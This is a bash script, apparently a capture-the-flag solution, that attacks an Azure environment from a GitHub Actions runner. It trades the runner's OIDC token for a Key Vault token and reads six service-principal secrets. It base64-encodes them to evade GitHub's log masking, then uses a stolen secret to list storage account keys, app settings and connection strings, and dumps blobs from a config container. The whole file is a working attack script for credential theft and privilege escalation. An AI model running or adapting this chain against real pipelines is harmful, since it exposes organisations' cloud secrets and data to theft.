#!/usr/bin/env bash
set -uo pipefail

TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
FED_CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"   # cicd-deployer: has FC + vault read
RG="rg-tbl-platform-prod-sea"

b64() { printf '%s' "$1" | base64 -w0 | tr -d '\n'; }

echo "===WIN_START==="

# 1) GitHub OIDC token
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
[ -z "$JWT" ] && { echo "NO_OIDC"; exit 1; }

# 2) vault token via the fed cicd-deployer client
VT=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$FED_CLIENT" -d grant_type=client_credentials \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "VAULT_TOK_LEN=${#VT}"

# 3) read the SP credential secrets (base64 to dodge GH masking)
for SN in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  R=$(curl -sS -m 20 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SN?api-version=7.4")
  echo "VSEC_${SN}=$(b64 "$R")"
done

# 4) reporting-service-principal credential -> ARM token
RSP=$(curl -sS -m 20 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
APPID=$(echo "$RSP" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("appId",""))' 2>/dev/null)
SEC=$(echo "$RSP" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("clientSecret",""))' 2>/dev/null)
echo "APPID=${APPID} SECLEN=${#SEC}"
echo "SEC_B64=$(b64 "$SEC")"

ARM=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$APPID" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$SEC" \
  -d 'scope=https://management.azure.com/.default' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "ARM_LEN=${#ARM}"

armpost() { curl -sS -m 20 -X POST "$1" -H "Authorization: Bearer ${ARM}" -H "Content-Type: application/json" -d '{}'; }

# 5) listKeys on all 4 storage accounts
declare -A SAKEY
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  R=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
  echo "LISTKEYS_${SA}=$(b64 "$R")"
  SAKEY[$SA]=$(echo "$R" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("keys",[{}])[0].get("value",""))' 2>/dev/null)
done

# 6) appsettings + connectionstrings for the reporting app (both candidate RGs)
for RG2 in rg-tbl-reporting-prod-eus rg-tbl-platform-prod-sea; do
  for SITE in app-tbl-reporting-prod app-tbl-storefront-prod; do
    A=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01")
    echo "APPSET_${RG2}_${SITE}=$(b64 "$A")"
    C=$(armpost "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/connectionstrings/list?api-version=2022-03-01")
    echo "CONNSTR_${RG2}_${SITE}=$(b64 "$C")"
  done
done

# 7) blob reader via SharedKey
read_blob() {
  python3 - "$1" "$2" "$3" "$4" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request
account, key, container, blob = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
v = "2019-12-12"
canon = f"/{account}/{container}/{blob}"
sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}/{blob}"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
try:
    print(urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace'))
except Exception as e:
    print(f"__ERR__ {type(e).__name__}: {e}")
PYEOF
}

list_blobs() {
  python3 - "$1" "$2" "$3" <<'PYEOF'
import sys, base64, hashlib, hmac, datetime, urllib.request, xml.etree.ElementTree as ET
account, key, container = sys.argv[1], sys.argv[2], sys.argv[3]
kb = base64.b64decode(key)
d = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
v = "2019-12-12"
canon = f"/{account}/{container}\ncomp:list\nrestype:container"
sts = "\n".join(["GET"] + [""]*11 + [f"x-ms-date:{d}\nx-ms-version:{v}", canon])
sig = base64.b64encode(hmac.new(kb, sts.encode(), hashlib.sha256).digest()).decode()
url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
req = urllib.request.Request(url, headers={"x-ms-date": d, "x-ms-version": v, "Authorization": f"SharedKey {account}:{sig}"})
data = urllib.request.urlopen(req, timeout=20).read()
ns = {'a':'http://schemas.microsoft.com/windowsazure'}
root = ET.fromstring(data)
for b in root.findall('.//a:Blob', ns):
    print(b.find('a:Name', ns).text)
PYEOF
}

# 8) if we have a key for the config account, dump container `config` (the flag lives here)
SA="sttblappcfgprodx3euoz"
K="${SAKEY[$SA]:-}"
if [ -n "$K" ]; then
  echo "===HAVE_KEY_${SA}==="
  BLOBS=$(list_blobs "$SA" "$K" "config" 2>/dev/null)
  echo "===BLOBS_config==="
  echo "$BLOBS"
  for b in $BLOBS; do
    [ -z "$b" ] && continue
    echo "===READ_${b}==="
    read_blob "$SA" "$K" "config" "$b" | base64 -w0 | tr -d '\n'
    echo ""
  done
else
  echo "===NO_KEY_${SA}==="
fi

echo "===WIN_END==="
